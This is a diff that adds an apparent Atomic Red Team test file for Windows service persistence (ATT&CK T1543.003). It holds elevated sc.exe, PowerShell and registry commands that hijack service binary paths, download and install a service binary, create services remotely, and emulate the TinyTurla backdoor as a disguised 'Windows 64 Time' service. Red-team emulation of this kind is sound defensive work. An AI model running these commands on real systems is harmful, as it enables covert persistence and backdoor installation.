@@ -1,0 +1,220 @@
+attack_technique: T1543.003
+display_name: 'Create or Modify System Process: Windows Service'
+
+atomic_tests:
+- name: Modify Fax service to run PowerShell
+  auto_generated_guid: ed366cde-7d12-49df-a833-671904770b9f
+  description: |
+    This test will temporarily modify the service Fax by changing the binPath to PowerShell
+    and will then revert the binPath change, restoring Fax to its original state.
+    Upon successful execution, cmd will modify the binpath for `Fax` to spawn powershell. Powershell will then spawn.
+  supported_platforms:
+  - windows
+  input_arguments:
+    service_name:
+      description: The name of the service that will be modified
+      type: string
+      default: Fax
+    service_binpath:
+      description: The default value for the binary path of the service
+      type: string
+      default: C:\WINDOWS\system32\fxssvc.exe
+  executor:
+    name: command_prompt
+    elevation_required: true
+    command: |
+      sc config #{service_name} binPath= "C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c \"write-host 'T1543.003 Test'\""
+      sc start #{service_name}
+    cleanup_command: |
+      sc config #{service_name} binPath= "#{service_binpath}" >nul 2>&1
+
+- name: Service Installation CMD
+  auto_generated_guid: 981e2942-e433-44e9-afc1-8c957a1496b6
+  description: |
+    Download an executable from github and start it as a service.
+    Upon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.
+  supported_platforms:
+  - windows
+  input_arguments:
+    binary_path:
+      description: Name of the service binary, include path.
+      type: path
+      default: PathToAtomicsFolder\T1543.003\bin\AtomicService.exe
+    service_type:
+      description: Type of service. May be own|share|interact|kernel|filesys|rec|userown|usershare
+      type: string
+      default: Own
+    startup_type:
+      description: Service start method. May be boot|system|auto|demand|disabled|delayed-auto
+      type: string
+      default: auto
+    service_name:
+      description: Name of the Service
+      type: string
+      default: AtomicTestService_CMD
+
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Service binary must exist on disk at specified location (#{binary_path})
+    prereq_command: |
+      if (Test-Path "#{binary_path}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path "#{binary_path}") -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"
+  executor:
+    name: command_prompt
+    elevation_required: true
+    command: |
+      sc.exe create #{service_name} binPath= "#{binary_path}" start=#{startup_type}  type=#{service_type}
+      sc.exe start #{service_name}
+    cleanup_command: |
+      sc.exe stop #{service_name} >nul 2>&1
+      sc.exe delete #{service_name} >nul 2>&1
+- name: Service Installation PowerShell
+  auto_generated_guid: 491a4af6-a521-4b74-b23b-f7b3f1ee9e77
+  description: |
+    Installs A Local Service via PowerShell.
+    Upon successful execution, powershell will download `AtomicService.exe` from github. Powershell will then use `New-Service` and `Start-Service` to start service. Results will be displayed.
+  supported_platforms:
+  - windows
+  input_arguments:
+    binary_path:
+      description: Name of the service binary, include path.
+      type: path
+      default: PathToAtomicsFolder\T1543.003\bin\AtomicService.exe
+    service_name:
+      description: Name of the Service
+      type: string
+      default: AtomicTestService_PowerShell
+
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Service binary must exist on disk at specified location (#{binary_path})
+    prereq_command: |
+      if (Test-Path "#{binary_path}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path "#{binary_path}") -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"
+  executor:
+    name: powershell
+    elevation_required: true
+    command: |
+      New-Service -Name "#{service_name}" -BinaryPathName "#{binary_path}"
+      Start-Service -Name "#{service_name}"
+    cleanup_command: |
+      Stop-Service -Name "#{service_name}" 2>&1 | Out-Null
+      try {(Get-WmiObject Win32_Service -filter "name='#{service_name}'").Delete()}
+      catch {}
+- name: TinyTurla backdoor service w64time
+  auto_generated_guid: ef0581fd-528e-4662-87bc-4c2affb86940
+  description: |
+    It's running Dll as service to emulate the TinyTurla backdoor
+
+    [Related Talos Blog](https://blog.talosintelligence.com/2021/09/tinyturla.html)
+  supported_platforms:
+  - windows
+  input_arguments:
+    dllfilename:
+      description: It specifies Dll file to run as service
+      type: string
+      default: PathToAtomicsFolder\T1543.003\bin\W64Time.dll
+  executor:
+    command: |-
+      copy "#{dllfilename}" %systemroot%\system32\
+      sc create W64Time binPath= "c:\Windows\System32\svchost.exe -k TimeService" type= share start=auto
+      sc config W64Time DisplayName= "Windows 64 Time"
+      sc description W64Time "Maintain date and time synch on all clients and services in the network"
+      reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /t REG_MULTI_SZ /d "W64Time" /f
+      reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%systemroot%\system32\w64time.dll" /f
+      reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v Hosts /t REG_SZ /d "127.0.0.1" /f
+      reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v Security /t REG_SZ /d "127.0.0.1" /f
+      reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v TimeLong /t REG_DWORD /d 300000 /f
+      reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v TimeShort /t REG_DWORD /d 5000 /f
+      sc start W64Time
+    cleanup_command: |-
+      sc stop W64Time
+      sc.exe delete W64Time
+      del %systemroot%\system32\w64time.dll
+      reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /f
+      reg delete "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /f
+    name: command_prompt
+    elevation_required: true
+- name: Remote Service Installation CMD
+  auto_generated_guid: fb4151a2-db33-4f8c-b7f8-78ea8790f961
+  description: |
+    Download an executable from github and start it as a service on a remote endpoint
+    Upon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.
+  supported_platforms:
+  - windows
+  input_arguments:
+    binary_path:
+      description: Name of the service binary, include path.
+      type: path
+      default: PathToAtomicsFolder\T1543.003\bin\AtomicService.exe
+    service_type:
+      description: Type of service. May be own,share,interact,kernel,filesys,rec,userown,usershare
+      type: string
+      default: Own
+    startup_type:
+      description: Service start method. May be boot,system,auto,demand,disabled,delayed-auto
+      type: string
+      default: auto
+    service_name:
+      description: Name of the Service
+      type: string
+      default: AtomicTestService_CMD
+    remote_host:
+      description: Name of the remote endpoint
+      type: string
+      default: localhost
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Service binary must exist on disk at specified location (#{binary_path})
+    prereq_command: |
+      if (Test-Path "#{binary_path}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory (split-path "#{binary_path}") -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"
+  executor:
+    name: command_prompt
+    elevation_required: true
+    command: |
+      sc.exe \\#{remote_host} create #{service_name} binPath= "#{binary_path}" start=#{startup_type} type=#{service_type}
+      sc.exe \\#{remote_host} start #{service_name}
+    cleanup_command: |
+      sc.exe \\#{remote_host} stop #{service_name} >nul 2>&1
+      sc.exe \\#{remote_host} delete #{service_name} >nul 2>&1
+- name: Modify Service to Run Arbitrary Binary (Powershell)
+  auto_generated_guid: 1f896ce4-8070-4959-8a25-2658856a70c9
+  description: |
+     This test will use PowerShell to temporarily modify a service to run an arbitrary executable by changing its binary path and will then revert the binary path change, restoring the service to its original state.
+     This technique was previously observed through SnapMC's use of Powerspolit's invoke-serviceabuse function. 
+     [Reference](https://blog.fox-it.com/2021/10/11/snapmc-skips-ransomware-steals-data/)
+  supported_platforms:
+  - windows
+  input_arguments:
+    service_name:
+      description: Name of the service to modify
+      type: string
+      default: fax
+    new_bin_path:
+      description: Path of the new service binary
+      type: String
+      default: '$env:windir\system32\notepad.exe'
+    original_bin_path:
+      description: Path of the original service binary
+      type: String
+      default: '$env:windir\system32\fxssvc.exe'
+  executor:
+    command: |-
+      Stop-Service -Name "#{service_name}" -force -erroraction silentlycontinue | Out-Null
+      set-servicebinarypath -name "#{service_name}" -path "#{new_bin_path}"
+      start-service -Name "#{service_name}" -erroraction silentlycontinue | out-null
+    cleanup_command: |-
+      Stop-Service -Name "#{service_name}" -force -erroraction silentlycontinue | Out-Null
+      set-servicebinarypath -name "#{service_name}" -path "#{original_bin_path}" -erroraction silentlycontinue | out-null
+    name: powershell
+    elevation_required: true      
